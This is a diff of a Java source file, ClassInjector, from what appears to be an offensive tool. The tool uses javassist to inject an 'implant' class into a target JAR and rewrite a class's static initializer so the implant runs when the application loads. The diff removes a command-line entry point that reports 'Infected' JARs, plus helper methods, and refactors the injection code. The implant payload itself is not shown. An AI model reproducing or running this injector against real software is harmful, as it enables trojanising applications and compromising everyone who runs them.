@@ -2,54 +2,22 @@ package org.example.injector;
 
 import javassist.CtClass;
 import javassist.bytecode.*;
-import org.example.implants.ClassImplant;
 
 import java.io.DataInputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
-import java.nio.file.Files;
 import java.nio.file.Path;
-import java.util.Arrays;
 import java.util.jar.JarEntry;
 
-import static org.example.injector.Helpers.setStaticFlagForMethod;
+import static org.example.injector.Helpers.*;
 
 public class ClassInjector {
     final static String IMPLANT_CLASS_NAME = "Init";
     private final Class<?> implantClass;
 
-    ClassInjector(Class<?> implantClass) {
+    public ClassInjector(Class<?> implantClass) {
         this.implantClass = implantClass;
-    }
-
-    public static void main(String[] args) {
-        if (args.length < 2) {
-            System.exit(1);
-        }
-
-        ClassInjector injector = new ClassInjector(ClassImplant.class);
-        try {
-            Path targetPath = Path.of(args[0]);
-            Path outputPath = Path.of(args[1]);
-            System.out.println("[i] Target JAR: " + targetPath);
-            System.out.println("[i] Output JAR: " + outputPath);
-            if (!Files.exists(targetPath) && !Files.isRegularFile(targetPath)) {
-                System.out.println("[!] Target JAR is not a regular existing file.");
-                System.exit(1);
-            }
-            if (Files.exists(outputPath) && targetPath.toRealPath().equals(outputPath.toRealPath())) {
-                System.out.println("[-] Target JAR and output JAR cannot be the same.");
-                System.exit(1);
-            }
-            if (injector.infect(targetPath, outputPath)) {
-                System.out.println("[+] Infected '" + targetPath + "'. Modified JAR available at: " + outputPath);
-            } else {
-                System.out.println("[-] Did not infect '" + targetPath + "'.");
-            }
-        } catch (IOException e) {
-            throw new RuntimeException(e);
-        }
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
@@ -100,7 +68,7 @@ public class ClassInjector {
                      * by an app.
                      */
                     modifyClinit(currentlyProcessing, implantedClass);
-                    currentlyProcessing.write(entry.addOnly());
+                    currentlyProcessing.write(entry.addAndGetStream());
                     System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
                 } catch (ClassNotFoundException e) {
                     throw new RuntimeException(e);
@@ -114,7 +82,6 @@ public class ClassInjector {
             return implantedClass != null;
         }
     }
-
 
     private static void modifyClinit(ClassFile targetClass, ClassFile implantClass) {
         MethodInfo implantInitMethod = implantClass.getMethod("implant");
@@ -178,27 +145,5 @@ public class ClassInjector {
 
         classFile.setName(newFqcn);
         classFile.compact();
-    }
-
-    private static String parsePackageNameFromFqcn(final String fqcn) {
-        String[] parts = fqcn.split("\\.");
-        if (parts.length < 2) {
-            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
-        }
-        String[] packageParts = Arrays.copyOfRange(parts, 0, parts.length - 1);
-        return String.join(".", packageParts);
-    }
-
-    private static String parseClassNameFromFqcn(final String fqcn) {
-        String[] parts = fqcn.split("\\.");
-        if (parts.length < 2) {
-            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
-        }
-        return parts[parts.length - 1];
-    }
-
-    private static JarEntry convertToJarEntry(final ClassFile classFile) {
-        String fullPathInsideJar = classFile.getName().replace(".", "/") + ".class";
-        return new JarEntry(fullPathInsideJar);
     }
 }
